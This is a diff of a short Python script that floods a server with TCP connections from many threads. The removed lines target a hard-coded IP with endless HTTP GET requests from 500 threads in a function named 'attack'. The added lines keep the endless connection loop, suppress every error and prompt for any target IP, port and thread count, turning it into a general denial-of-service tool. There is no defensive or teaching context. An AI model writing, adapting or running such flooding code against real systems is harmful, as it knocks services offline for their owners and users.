@@ -1,18 +1,24 @@
 import socket
 import threading
 
-target = '185.107.194.87'
-port = 60184
+server_ip = input("Enter server IP: ")
+server_port = int(input("Enter server port: "))
+num_threads = int(input("Enter number of threads: "))
 
-def attack():
+# Resolve domain name to numeric IP address
+try:
+    server_ip = socket.gethostbyname(server_ip)
+except:
+    pass
+
+def connect_to_server():
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
-        s.close()
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((server_ip, server_port))
+        except:
+            pass
 
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
-
+for i in range(num_threads):
+    t = threading.Thread(target=connect_to_server)
+    t.start()
